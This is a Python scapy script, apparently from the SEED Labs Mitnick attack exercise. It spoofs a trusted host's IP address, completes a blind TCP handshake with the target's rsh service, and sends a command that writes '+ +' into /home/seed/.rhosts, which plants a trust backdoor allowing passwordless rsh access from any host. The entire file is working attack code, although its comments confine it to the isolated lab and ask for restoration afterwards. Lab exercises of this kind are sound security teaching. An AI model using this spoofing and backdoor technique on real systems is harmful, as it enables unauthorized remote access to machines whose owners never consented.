#!/usr/bin/env python3
"""SEED Task 3 ONLY: reproduce the lab's deliberately insecure trust entry.
This changes /home/seed/.rhosts on X-Terminal to '+ +'.
It must be used ONLY in the isolated SEED Docker environment, then restored.
Start rsh_second.py first. Do not execute against real systems.
"""
import os
from threading import Thread
from time import sleep
from scapy.all import IP, TCP, Raw, send, sniff

TRUSTED_IP = "10.9.0.6"
TARGET_IP = "10.9.0.5"
IFACE = os.environ.get("LAB_IFACE", "br-6514365f0955")
SOURCE_PORT = 1023
RSH_PORT = 514
CLIENT_ISN = 0x1000
handled = False

# RSH fields are NUL-separated. The last field is the task's lab-only command.
RSH_REQUEST = (
    b"9090\x00seed\x00seed\x00"
    b"printf '+ +\\n' > /home/seed/.rhosts\x00"
)


def on_packet(packet):
    global handled
    if handled or not packet.haslayer(TCP):
        return
    tcp = packet[TCP]
    if tcp.flags != "SA":
        return
    handled = True
    seq = (CLIENT_ISN + 1) % (2**32)
    ack = (tcp.seq + 1) % (2**32)
    ip = IP(src=TRUSTED_IP, dst=TARGET_IP)
    send(ip / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
                  flags="A", seq=seq, ack=ack), verbose=False)
    send(ip / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
                  flags="PA", seq=seq, ack=ack)
         / Raw(load=RSH_REQUEST), verbose=False)
    print(f"[+] Task 3 RSH request sent ({len(RSH_REQUEST)} bytes)",
          flush=True)


def send_initial_syn():
    sleep(1)
    packet = (
        IP(src=TRUSTED_IP, dst=TARGET_IP)
        / TCP(sport=SOURCE_PORT, dport=RSH_PORT,
              flags="S", seq=CLIENT_ISN)
    )
    send(packet, count=1, verbose=False)
    print("[+] Spoofed SYN sent", flush=True)


if __name__ == "__main__":
    print("[!] SEED CONTAINERS ONLY. Restore .rhosts after Task 3.",
          flush=True)
    Thread(target=send_initial_syn, daemon=True).start()
    sniff(
        iface=IFACE,
        filter=(f"tcp and src host {TARGET_IP} and dst host {TRUSTED_IP} "
                f"and src port {RSH_PORT} and dst port {SOURCE_PORT}"),
        prn=on_packet,
        stop_filter=lambda _packet: handled,
        timeout=15,
        store=False,
    )
    print("[*] Task 3 request test finished", flush=True)
